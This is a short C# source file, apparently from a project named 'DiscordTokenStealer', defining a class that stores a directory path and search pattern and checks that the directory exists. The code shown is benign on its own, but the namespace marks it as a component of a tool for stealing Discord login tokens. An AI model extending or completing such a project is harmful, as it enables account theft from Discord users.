namespace DiscordTokenStealer.DirectorySearchProviders;

public class DirectorySearchProvider : IDirectorySearchProvider
{
    public string Directory { get; }
    public string Pattern { get; }
    public bool Exists => System.IO.Directory.Exists(Directory);
    public DirectorySearchProvider(string directory, string searchPattern = "*")
    {
        Directory = directory;
        Pattern = searchPattern;
    }
}